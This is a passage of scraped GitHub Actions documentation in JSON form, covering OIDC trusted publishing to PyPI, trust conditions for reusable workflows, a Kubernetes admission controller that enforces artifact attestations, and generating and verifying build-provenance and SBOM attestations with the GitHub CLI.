        "text": "Thepypa/gh-action-pypi-publishaction has built-in support for trusted publishing, which can be enabled by giving its containing job theid-token: writepermission and omittingusernameandpassword."
      },
      {
        "type": "paragraph",
        "text": "The following example uses thepypa/gh-action-pypi-publishaction to exchange an OIDC token for a PyPI API token, which is then used to upload a package's release distributions to PyPI."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n  release-build:\n    runs-on: ubuntu-latest\n\n    steps:\n      - uses: actions/checkout@v4\n\n      - uses: actions/setup-python@v5\n        with:\n          python-version: \"3.x\"\n\n      - name: build release distributions\n        run: |\n          # NOTE: put your own distribution build steps here.\n          python -m pip install build\n          python -m build\n\n      - name: upload windows dists\n        uses: actions/upload-artifact@v4\n        with:\n          name: release-dists\n          path: dist/\n\n  pypi-publish:\n    runs-on: ubuntu-latest\n    needs:\n      - release-build\n    permissions:\n      id-token: write\n\n    steps:\n      - name: Retrieve release distributions\n        uses: actions/download-artifact@v4\n        with:\n          name: release-dists\n          path: dist/\n\n      - name: Publish release distributions to PyPI\n        uses: pypa/gh-action-pypi-publish@3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f"
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/using-openid-connect-with-reusable-workflows",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About reusable workflows"
      },
      {
        "type": "paragraph",
        "text": "Rather than copying and pasting deployment jobs from one workflow to another, you can create a reusable workflow that performs the deployment steps. A reusable workflow can be used by another workflow if it meets one of the access requirements described inReusing workflows."
      },
      {
        "type": "paragraph",
        "text": "You should be familiar with the concepts described inReusing workflowsandAbout security hardening with OpenID Connect."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Defining the trust conditions"
      },
      {
        "type": "paragraph",
        "text": "When combined with OpenID Connect (OIDC), reusable workflows let you enforce consistent deployments across your repository, organization, or enterprise. You can do this by defining trust conditions on cloud roles based on reusable workflows. The available options will vary depending on your cloud provider:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Usingjob_workflow_ref:To create trust conditions based on reusable workflows, your cloud provider must support custom claims forjob_workflow_ref. This allows your cloud provider to identify which repository the job originally came from.For clouds that only support the standard claims (audience (aud) and subject (sub)), you can use the API to customize thesubclaim to includejob_workflow_ref. For more information, seeAbout security hardening with OpenID Connect. Support for custom claims is currently available for Google Cloud Platform and HashiCorp Vault.",
          "To create trust conditions based on reusable workflows, your cloud provider must support custom claims forjob_workflow_ref. This allows your cloud provider to identify which repository the job originally came from.",
          "For clouds that only support the standard claims (audience (aud) and subject (sub)), you can use the API to customize thesubclaim to includejob_workflow_ref. For more information, seeAbout security hardening with OpenID Connect. Support for custom claims is currently available for Google Cloud Platform and HashiCorp Vault.",
          "Customizing the token claims:You can configure more granular trust conditions by customizing the subject (sub) claim that's included with the JWT. For more information, seeAbout security hardening with OpenID Connect.",
          "You can configure more granular trust conditions by customizing the subject (sub) claim that's included with the JWT. For more information, seeAbout security hardening with OpenID Connect."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "How the token works with reusable workflows"
      },
      {
        "type": "paragraph",
        "text": "During a workflow run, GitHub's OIDC provider presents a OIDC token to the cloud provider which contains information about the job. If that job is part of a reusable workflow, the token will include the standard claims that contain information about the calling workflow, and will also include a custom claim calledjob_workflow_refthat contains information about the called workflow."
      },
      {
        "type": "paragraph",
        "text": "For example, the following OIDC token is for a job that was part of a called workflow. Theworkflow,ref, and other attributes describe the caller workflow, whilejob_workflow_refrefers to the called workflow:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "{\n  \"typ\": \"JWT\",\n  \"alg\": \"RS256\",\n  \"x5t\": \"example-thumbprint\",\n  \"kid\": \"example-key-id\"\n}\n{\n  \"jti\": \"example-id\",\n  \"sub\": \"repo:octo-org/octo-repo:environment:prod\",\n  \"aud\": \"https://github.com/octo-org\",\n  \"ref\": \"refs/heads/main\",\n  \"sha\": \"example-sha\",\n  \"repository\": \"octo-org/octo-repo\",\n  \"repository_owner\": \"octo-org\",\n  \"actor_id\": \"12\",\n  \"repository_id\": \"74\",\n  \"repository_owner_id\": \"65\",\n  \"run_id\": \"example-run-id\",\n  \"run_number\": \"10\",\n  \"run_attempt\": \"2\",\n  \"actor\": \"octocat\",\n  \"workflow\": \"example-workflow\",\n  \"head_ref\": \"\",\n  \"base_ref\": \"\",\n  \"event_name\": \"workflow_dispatch\",\n  \"ref_type\": \"branch\",\n  \"job_workflow_ref\": \"octo-org/octo-automation/.github/workflows/oidc.yml@refs/heads/main\",\n  \"iss\": \"https://token.actions.githubusercontent.com\",\n  \"nbf\": 1632492967,\n  \"exp\": 1632493867,\n  \"iat\": 1632493567\n}"
      },
      {
        "type": "paragraph",
        "text": "If your reusable workflow performs deployment steps, then it will typically need access to a specific cloud role, and you might want to allow any repository in your organization to call that reusable workflow. To permit this, you'll create the trust condition that allows any repository and any caller workflow, and then filter on the organization and the called workflow. See the next section for some examples."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Examples"
      },
      {
        "type": "paragraph",
        "text": "Filtering for reusable workflows within a specific repository"
      },
      {
        "type": "paragraph",
        "text": "You can configure a custom claim that filters for any reusable workflow in a specific repository. In this example, the workflow run must have originated from a job defined in a reusable workflow in theocto-org/octo-automationrepository, and in any repository that is owned by theocto-orgorganization."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Subject:Syntax:repo:ORG_NAME/*Example:repo:octo-org/*",
          "Syntax:repo:ORG_NAME/*",
          "Example:repo:octo-org/*",
          "Custom claim:Syntax:job_workflow_ref:ORG_NAME/REPO_NAMEExample:job_workflow_ref:octo-org/octo-automation@*",
          "Syntax:job_workflow_ref:ORG_NAME/REPO_NAME",
          "Example:job_workflow_ref:octo-org/octo-automation@*"
        ]
      },
      {
        "type": "paragraph",
        "text": "Filtering for a specific reusable workflow at a specific ref"
      },
      {
        "type": "paragraph",
        "text": "You can configure a custom claim that filters for a specific reusable workflow. In this example, the workflow run must have originated from a job defined in the reusable workflowocto-org/octo-automation/.github/workflows/deployment.yml, and in any repository that is owned by theocto-orgorganization."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Subject:Syntax:repo:ORG_NAME/*Example:repo:octo-org/*",
          "Syntax:repo:ORG_NAME/*",
          "Example:repo:octo-org/*",
          "Custom claim:Syntax:job_workflow_ref:ORG_NAME/REPO_NAME/.github/workflows/WORKFLOW_FILE@refExample:job_workflow_ref:octo-org/octo-automation/.github/workflows/deployment.yml@ 10040c56a8c0253d69db7c1f26a0d227275512e2",
          "Syntax:job_workflow_ref:ORG_NAME/REPO_NAME/.github/workflows/WORKFLOW_FILE@ref",
          "Example:job_workflow_ref:octo-org/octo-automation/.github/workflows/deployment.yml@ 10040c56a8c0253d69db7c1f26a0d227275512e2"
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/security-for-github-actions/using-artifact-attestations/enforcing-artifact-attestations-with-a-kubernetes-admission-controller",
    "content": [
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Before proceeding, ensure you have enabled build provenance for container images, including setting thepush-to-registryattribute in theattest-build-provenanceactionas documented inGenerating build provenance for container images. This is required for the Policy Controller to verify the attestation."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "About Kubernetes admission controller"
      },
      {
        "type": "paragraph",
        "text": "Artifact attestationsenable you to create unfalsifiable provenance and integrity guarantees for the software you build. In turn, people who consume your software can verify where and how your software was built."
      },
      {
        "type": "paragraph",
        "text": "Kubernetes admission controllers are plugins that govern the behavior of the Kubernetes API server. They are commonly used to enforce security policies and best practices in a Kubernetes cluster."
      },
      {
        "type": "paragraph",
        "text": "Using the open sourceSigstore Policy Controllerproject you can add an admission controller to your Kubernetes cluster that can enforce artifact attestations. This way, you can ensure that only artifacts with valid attestations can be deployed."
      },
      {
        "type": "paragraph",
        "text": "Toinstall the controller, we offertwo Helm charts: one for deploying the Sigstore Policy Controller, and another for loading the GitHub trust root and a default policy."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "About image verification"
      },
      {
        "type": "paragraph",
        "text": "When the Policy Controller is installed, it will intercept all image pull requests and verify the attestation for the image. The attestation must be stored in the image registry as anOCI attached artifactcontaining aSigstore Bundlewhich contains the attestation and cryptographic material (e.g. certificates and signatures) used to verify the attestation. A verification process is then performed that ensures the image was built with the specified build provenance and matches any policies enabled by the cluster administrator."
      },
      {
        "type": "paragraph",
        "text": "In order for an image to be verifiable, it must have a valid provenance attestation in the registry, which can be done by enabling thepush-to-registry: trueattribute in theactions/attest-build-provenanceaction. SeeGenerating build provenance for container imagesfor more details on how to generate attestations for container images."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "About trust roots and policies"
      },
      {
        "type": "paragraph",
        "text": "The Sigstore Policy Controller is primarily configured with trust roots and policies, represented by the Custom ResourcesTrustRootandClusterImagePolicy. ATrustRootrepresents a trusted distribution channel for the public key material used to verify attestations. AClusterImagePolicyrepresents a policy for enforcing attestations on images."
      },
      {
        "type": "paragraph",
        "text": "ATrustRootmay also contain aTUFrepository root, making it possible for your cluster to continuously and securely receive updates to its trusted public key material. If left unspecified, aClusterImagePolicywill by default use the open source Sigstore Public Good Instance's key material. When verifying attestations generated for private repositories, theClusterImagePolicymust reference the GitHubTrustRoot."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Getting started with Kubernetes admission controller"
      },
      {
        "type": "paragraph",
        "text": "To set up an admission controller for enforcing GitHub artifact attestations, you need to:"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Deploy the Sigstore Policy Controller.",
          "Add the GitHubTrustRootand aClusterImagePolicyto your cluster.",
          "Enable the policy in your namespace."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Deploy the Sigstore Policy Controller"
      },
      {
        "type": "paragraph",
        "text": "We have packaged the Sigstore Policy Controller as aGitHub distributed Helm chart. Before you begin, ensure you have the following prerequisites:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "A Kubernetes cluster with version 1.27 or later",
          "Helm3.0 or later",
          "kubectl"
        ]
      },
      {
        "type": "paragraph",
        "text": "First, install the Helm chart that deploys the Sigstore Policy Controller:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "helm upgrade policy-controller --install --atomic \\\n  --create-namespace --namespace artifact-attestations \\\n  oci://ghcr.io/github/artifact-attestations-helm-charts/policy-controller \\\n  --version v0.12.0-github12"
      },
      {
        "type": "paragraph",
        "text": "This installs the Policy Controller into theartifact-attestationsnamespace. At this point, no policies have been configured, and it will not enforce any attestations."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Add the GitHubTrustRootand aClusterImagePolicy"
      },
      {
        "type": "paragraph",
        "text": "Once the policy controller has been deployed, you need to add the GitHubTrustRootand aClusterImagePolicyto your cluster. Use the Helm chart we provide to do this. Make sure to replaceMY-ORGANIZATIONwith your GitHub organization's name (e.g.,githuboroctocat-inc)."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "helm upgrade trust-policies --install --atomic \\\n --namespace artifact-attestations \\\n oci://ghcr.io/github/artifact-attestations-helm-charts/trust-policies \\\n --version v0.6.2 \\\n --set policy.enabled=true \\\n --set policy.organization=MY-ORGANIZATION"
      },
      {
        "type": "paragraph",
        "text": "You've now installed the GitHub trust root, and an artifact attestation policy into your cluster. This policy will reject artifacts that have not originated from within your GitHub organization."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Enable the policy in your namespace"
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "This policy will not be enforced until you specify which namespaces it should apply to."
      },
      {
        "type": "paragraph",
        "text": "Each namespace in your cluster can independently enforce policies. To enable enforcement in a namespace, you can add the following label to the namespace:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "metadata:\n  labels:\n    policy.sigstore.dev/include: \"true\""
      },
      {
        "type": "paragraph",
        "text": "After the label is added, the GitHub artifact attestation policy will be enforced in the namespace."
      },
      {
        "type": "paragraph",
        "text": "Alternatively, you may run:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "kubectl label namespace MY-NAMESPACE policy.sigstore.dev/include=true"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Matching images"
      },
      {
        "type": "paragraph",
        "text": "By default, the policy installed with thetrust-policiesHelm chart will verify attestations for all images before admitting them into the cluster. If you only intend to enforce attestations for a subset of images, you can use the Helm valuespolicy.imagesandpolicy.exemptImagesto specify a list of images to match against. These values can be set to a list of glob patterns that match the image names. The globbing syntax uses Gofilepathsemantics, with the addition of**to match any character sequence, including slashes."
      },
      {
        "type": "paragraph",
        "text": "For example, to enforce attestations for images that match the patternghcr.io/MY-ORGANIZATION/*and admitbusyboxwithout a valid attestation, you can run:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "helm upgrade trust-policies --install --atomic \\\n --namespace artifact-attestations \\\n oci://ghcr.io/github/artifact-attestations-helm-charts/trust-policies \\\n --version v0.6.2 \\\n --set policy.enabled=true \\\n --set policy.organization=MY-ORGANIZATION \\\n --set-json 'policy.exemptImages=[\"index.docker.io/library/busybox**\"]' \\\n --set-json 'policy.images=[\"ghcr.io/MY-ORGANIZATION/**\"]'"
      },
      {
        "type": "paragraph",
        "text": "All patterns must use the fully-qualified name, even if the images originate from Docker Hub. In this example, if we want to exempt the imagebusybox, we must provide the full name including the domain and double-star glob to match all image versions:index.docker.io/library/busybox**."
      },
      {
        "type": "paragraph",
        "text": "Note that any image you intend to admitmusthave a matching glob pattern in thepolicy.imageslist. If an image does not match any pattern, it will be rejected. Additionally, if an image matches bothpolicy.imagesandpolicy.exemptImages, it will be rejected."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Advanced usage"
      },
      {
        "type": "paragraph",
        "text": "To see the full set of options you may configure with the Helm chart, you can run either of the following commands.\nFor policy controller options:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "helm show values oci://ghcr.io/github/artifact-attestations-helm-charts/policy-controller --version v0.12.0-github12"
      },
      {
        "type": "paragraph",
        "text": "For trust policy options:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "helm show values oci://ghcr.io/github/artifact-attestations-helm-charts/trust-policies --version v0.6.2"
      },
      {
        "type": "paragraph",
        "text": "For more information on the Sigstore Policy Controller, see theSigstore Policy Controller documentation."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-and-reusable-workflows-to-achieve-slsa-v1-build-level-3",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "Artifact attestations are a great way to create unfalsifiable provenance and integrity guarantees for the software you build."
      },
      {
        "type": "paragraph",
        "text": "But remember that by itself, artifact attestations provides links, like the build instructions an artifact was built with, which meets SLSA v1.0 Build Level 2. To make an informed risk decision, it's up to you to follow those links and evaluate those build instructions."
      },
      {
        "type": "paragraph",
        "text": "You can take this a step further by requiring builds make use of known, vetted build instructions. A great way to do this is to have your build take place in a reusable workflow that many repositories across your organization share. Reusable workflows can provide isolation between the build process and the calling workflow, to meet SLSA v1.0 Build Level 3."
      },
      {
        "type": "paragraph",
        "text": "Before starting this guide, you should be familiar with:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Generating artifact attestations. SeeUsing artifact attestations to establish provenance for builds.",
          "Writing and using reusable workflows. SeeReusing workflows."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Step 1: Configuring your builds"
      },
      {
        "type": "paragraph",
        "text": "First, we need to build with both artifact attestations and a reusable workflow."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Building with a reusable workflow"
      },
      {
        "type": "paragraph",
        "text": "If you aren't already using reusable workflows to build your software, you'll need to take your build steps and move them into a reusable workflow. For more information on how to write and call a reusable workflow, seeReusing workflows."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Building with artifact attestations"
      },
      {
        "type": "paragraph",
        "text": "The reusable workflow you use to build your software must also generate artifact attestations to establish build provenance. For more information, seeUsing artifact attestations to establish provenance for builds."
      },
      {
        "type": "paragraph",
        "text": "When you use a reusable workflow to generate artifact attestations, both the calling workflow and the reusable workflow need to have the following permissions."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "permissions:\n  attestations: write\n  contents: read\n  id-token: write"
      },
      {
        "type": "paragraph",
        "text": "If you are building container images, you will also need to include thepackages: writepermission."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Step 2: Verifying artifact attestations built with a reusable workflow"
      },
      {
        "type": "paragraph",
        "text": "To verify the artifact attestations generated with your builds, you can usegh attestation verifyfrom the GitHub CLI."
      },
      {
        "type": "paragraph",
        "text": "Thegh attestation verifycommand requires either--owneror--repoflags to be used with it. These flags do two things."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "They tellgh attestation verifywhere to fetch the attestation from. This will always be your caller workflow.",
          "They tellgh attestation verifywhere the workflow that did the signing came from. This will always be the workflow that usesattest-build-provenanceaction, which may be a reusable workflow."
        ]
      },
      {
        "type": "paragraph",
        "text": "You can use optional flags with thegh attestation verifycommand."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "If your reusable workflow is not in the same repository as the caller workflow, use the--signer-repoflag to specify the repository that contains the reusable workflow.",
          "If you would like to require an artifact attestation to be signed with a specific workflow, use the--signer-workflowflag to indicate the workflow file that should be used."
        ]
      },
      {
        "type": "paragraph",
        "text": "For example, if your calling workflow isORGANIZATION_NAME/REPOSITORY_NAME/.github/workflows/calling.ymland it usesREUSABLE_ORGANIZATION_NAME/REUSABLE_REPOSITORY_NAME/.github/workflows/reusable.ymlyou could do:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh attestation verify -o ORGANIZATION_NAME --signer-repo REUSABLE_ORGANIZATION_NAME/REUSABLE_REPOSITORY_NAME PATH/TO/YOUR/BUILD/ARTIFACT-BINARY"
      },
      {
        "type": "paragraph",
        "text": "Or if you want to specify the exact workflow:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh attestation verify -o ORGANIZATION_NAME --signer-workflow REUSABLE_ORGANIZATION_NAME/REUSABLE_REPOSITORY_NAME/.github/workflows/reusable.yml PATH/TO/YOUR/BUILD/ARTIFACT-BINARY"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Conclusion"
      },
      {
        "type": "paragraph",
        "text": "You are now building and signing your artifacts in a reusable workflow, which can provide the isolation required by SLSA v1.0 Build Level 3. You can verify artifacts are built with known, vetted build instructions by requiring your artifact was built with a specific workflow, reusable or not."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/security-for-github-actions/using-artifact-attestations/using-artifact-attestations-to-establish-provenance-for-builds",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "About artifact attestations"
      },
      {
        "type": "paragraph",
        "text": "Artifact attestations enable you to create unfalsifiable provenance and integrity guarantees for the software you build. In turn, people who consume your software can verify where and how your software was built."
      },
      {
        "type": "paragraph",
        "text": "When you generate artifact attestations with your software, you create cryptographically signed claims that establish your build's provenance and include the following information:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "A link to the workflow associated with the artifact.",
          "The repository, organization, environment, commit SHA, and triggering event for the artifact.",
          "Other information from the OIDC token used to establish provenance. For more information, seeAbout security hardening with OpenID Connect."
        ]
      },
      {
        "type": "paragraph",
        "text": "You can also generate artifact attestations that include an associated software bill of materials (SBOM). Associating your builds with a list of the open source dependencies used in them provides transparency and enables consumers to comply with data protection standards."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "About SLSA levels for artifact attestations"
      },
      {
        "type": "paragraph",
        "text": "The SLSA framework is an industry standard used to evaluate supply chain security. It is organized into levels. Each level represents an increasing degree of security and trustworthiness for a software supply chain. Artifact attestations by itself provides SLSA v1.0 Build Level 2."
      },
      {
        "type": "paragraph",
        "text": "This provides a link between your artifact and its build instructions, but you can take this a step further by requiring builds make use of known, vetted build instructions. A great way to do this is to have your build take place in a reusable workflow that many repositories across your organization share. Reusable workflows can provide isolation between the build process and the calling workflow, to meet SLSA v1.0 Build Level 3. For more information, seeUsing artifact attestations and reusable workflows to achieve SLSA v1 Build Level 3."
      },
      {
        "type": "paragraph",
        "text": "For more information on SLSA levels, seeSLSA Security Levels."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "About using Sigstore for artifact attestations"
      },
      {
        "type": "paragraph",
        "text": "To generate artifact attestations, GitHub uses Sigstore, which is an open source project that offers a comprehensive solution for signing and verifying software artifacts via attestations."
      },
      {
        "type": "paragraph",
        "text": "Public repositoriesthat generate artifact attestations use theSigstore Public Good Instance. A copy of the generated Sigstore bundle is stored with GitHub and is also written to an immutable transparency log that is publicly readable on the internet."
      },
      {
        "type": "paragraph",
        "text": "Private repositoriesthat generate artifact attestations use GitHub's Sigstore instance. GitHub's Sigstore instance uses the same codebase as the Sigstore Public Good Instance, but it does not have a transparency log and only federates with GitHub Actions."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "What to attest"
      },
      {
        "type": "paragraph",
        "text": "Generating attestations alone doesn't provide any security benefit, the attestations must be verified for the benefit to be realized. Here are some guidelines for how to think about what to sign and how often:"
      },
      {
        "type": "paragraph",
        "text": "You should sign:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Software you are releasing that you expect people to rungh attestation verify ...on.",
          "Binaries people will run, packages people will download, or manifests that include hashes of detailed contents."
        ]
      },
      {
        "type": "paragraph",
        "text": "You shouldnotsign:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Frequent builds that are just for automated testing.",
          "Individual files like source code, documentation files, or embedded images."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "About verifying artifact attestations"
      },
      {
        "type": "paragraph",
        "text": "If you consume software that publishes artifact attestations, you can use the GitHub CLI to verify those attestations. Because the attestations give you information about where and how software was built, you can use that information to create and enforce security policies that elevate your supply chain security. For more information, seeVerifying artifact attestations with the GitHub CLI."
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "It is important to remember that artifact attestations arenota guarantee that an artifact is secure. Instead, artifact attestations link you to the source code and the build instructions that produced them. It is up to you to define your policy criteria, evaluate that policy by evaluating the content, and make an informed risk decision when you are consuming software."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Generating artifact attestations for your builds"
      },
      {
        "type": "paragraph",
        "text": "You can use GitHub Actions to generate artifact attestations that establish build provenance for artifacts such as binaries and container images."
      },
      {
        "type": "paragraph",
        "text": "To generate an artifact attestation, you must:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Ensure you have the appropriate permissions configured in your workflow.",
          "Include a step in your workflow that uses theattest-build-provenanceaction."
        ]
      },
      {
        "type": "paragraph",
        "text": "When you run your updated workflows, they will build your artifacts and generate an artifact attestation that establishes build provenance. You can view attestations in your repository'sActionstab. For more information, see theattest-build-provenancerepository."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Generating build provenance for binaries"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "In the workflow that builds the binary you would like to attest, add the following permissions.permissions:id-token:writecontents:readattestations:write",
          "After the step where the binary has been built, add the following step.-name:Generateartifactattestationuses:actions/attest-build-provenance@v2with:subject-path:'PATH/TO/ARTIFACT'The value of thesubject-pathparameter should be set to the path to the binary you want to attest."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Generating build provenance for container images"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "In the workflow that builds the container image you would like to attest, add the following permissions.permissions:id-token:writecontents:readattestations:writepackages:write",
          "After the step where the image has been built, add the following step.-name:Generateartifactattestationuses:actions/attest-build-provenance@v2with:subject-name:${{env.REGISTRY}}/${{env.IMAGE_NAME}}subject-digest:'sha256:fedcba0...'push-to-registry:trueThe value of thesubject-nameparameter should specify the fully-qualified image name. For example,ghcr.io/user/apporacme.azurecr.io/user/app. Do not include a tag as part of the image name.The value of thesubject-digestparameter should be set to the SHA256 digest of the subject for the attestation, in the formsha256:HEX_DIGEST. If your workflow usesdocker/build-push-action, you can use thedigestoutput from that step to supply the value. For more information on using outputs, seeWorkflow syntax for GitHub Actions."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Generating an attestation for a software bill of materials (SBOM)"
      },
      {
        "type": "paragraph",
        "text": "You can generate signed SBOM attestations for workflow artifacts."
      },
      {
        "type": "paragraph",
        "text": "To generate an attestation for an SBOM, you must:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Ensure you have the appropriate permissions configured in your workflow.",
          "Create an SBOM for your artifact. For more information, seeanchore-sbom-actionin the GitHub Marketplace.",
          "Include a step in your workflow that uses theattest-sbomaction."
        ]
      },
      {
        "type": "paragraph",
        "text": "When you run your updated workflows, they will build your artifacts and generate an SBOM attestation. You can view attestations in your repository'sActionstab. For more information, see theattest-sbomactionrepository."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Generating an SBOM attestation for binaries"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "In the workflow that builds the binary you would like to attest, add the following permissions.permissions:id-token:writecontents:readattestations:write",
          "After the step where the binary has been built, add the following step.-name:GenerateSBOMattestationuses:actions/attest-sbom@v1with:subject-path:'PATH/TO/ARTIFACT'sbom-path:'PATH/TO/SBOM'The value of thesubject-pathparameter should be set to the path of the binary the SBOM describes. The value of thesbom-pathparameter should be set to the path of the SBOM file you generated."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Generating an SBOM attestation for container images"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "In the workflow that builds the container image you would like to attest, add the following permissions.permissions:id-token:writecontents:readattestations:writepackages:write",
          "After the step where the image has been built, add the following step.-name:GenerateSBOMattestationuses:actions/attest-sbom@v1with:subject-name:${{env.REGISTRY}}/PATH/TO/IMAGEsubject-digest:'sha256:fedcba0...'sbom-path:'sbom.json'push-to-registry:trueThe value of thesubject-nameparameter should specify the fully-qualified image name. For example,ghcr.io/user/apporacme.azurecr.io/user/app. Do not include a tag as part of the image name.The value of thesubject-digestparameter should be set to the SHA256 digest of the subject for the attestation, in the formsha256:HEX_DIGEST. If your workflow usesdocker/build-push-action, you can use thedigestoutput from that step to supply the value. For more information on using outputs, seeWorkflow syntax for GitHub Actions.The value of thesbom-pathparameter should be set to the path to the JSON-formatted SBOM file you want to attest."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Verifying artifact attestations with the GitHub CLI"
      },
      {
        "type": "paragraph",
        "text": "You can validate artifact attestations for binaries and container images and validate SBOM attestations using the GitHub CLI. For more information, see theattestationsection of the GitHub CLI manual."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "These commands assume you are in an online environment. If you are in an offline or air-gapped environment, seeVerifying attestations offline."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Verifying an artifact attestation for binaries"
      },
      {
        "type": "paragraph",
        "text": "To verify artifact attestations forbinaries, use the following GitHub CLI command."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh attestation verify PATH/TO/YOUR/BUILD/ARTIFACT-BINARY -R ORGANIZATION_NAME/REPOSITORY_NAME"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Verifying an artifact attestation for container images"
      },
      {
        "type": "paragraph",
        "text": "To verify artifact attestations forcontainer images, you must provide the image's FQDN prefixed withoci://instead of the path to a binary. You can use the following GitHub CLI command."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "docker login ghcr.io\n\ngh attestation verify oci://ghcr.io/ORGANIZATION_NAME/IMAGE_NAME:test -R ORGANIZATION_NAME/REPOSITORY_NAME"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Verifying an attestation for SBOMs"
      },
      {
        "type": "paragraph",
        "text": "To verify SBOM attestations, you have to provide the--predicate-typeflag to reference a non-default predicate. For more information, seeVetted predicatesin thein-toto/attestationrepository."
      },
      {
        "type": "paragraph",
        "text": "For example, theattest-sbomactioncurrently supports either SPDX or CycloneDX SBOM predicates. To verify an SBOM attestation in the SPDX format, you can use the following GitHub CLI command."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh attestation verify PATH/TO/YOUR/BUILD/ARTIFACT-BINARY \\\n  -R ORGANIZATION_NAME/REPOSITORY_NAME \\\n  --predicate-type https://spdx.dev/Document/v2.3"
      },
      {
        "type": "paragraph",
        "text": "To view more information on the attestation, reference the--format jsonflag. This can be especially helpful when reviewing SBOM attestations."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "gh attestation verify PATH/TO/YOUR/BUILD/ARTIFACT-BINARY \\\n  -R ORGANIZATION_NAME/REPOSITORY_NAME \\\n  --predicate-type https://spdx.dev/Document/v2.3 \\\n  --format json \\\n  --jq '.[].verificationResult.statement.predicate'"
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/security-for-github-actions/using-artifact-attestations/verifying-attestations-offline",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Introduction"
      },
      {
        "type": "paragraph",
        "text": "Artifact attestations are a great way to create unfalsifiable provenance and integrity guarantees for the software you build."
      },
      {
        "type": "paragraph",
        "text": "By default, attestations are stored in GitHub's attestation API, whichgh attestation verifywill query when you go to verify your attestation. That command will also contact GitHub's servers to check for updated key material to use to verify the attestation."
      },
      {
        "type": "paragraph",
        "text": "This command can work without internet connectivity, but you need to supply the attestation bundle and the key material in the trusted root manually."
      },
      {
        "type": "paragraph",
        "text": "Before starting this guide, you should be building with generating artifact attestations. SeeUsing artifact attestations to establish provenance for builds."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Step 1: Download attestation bundle"
      },
      {
        "type": "paragraph",
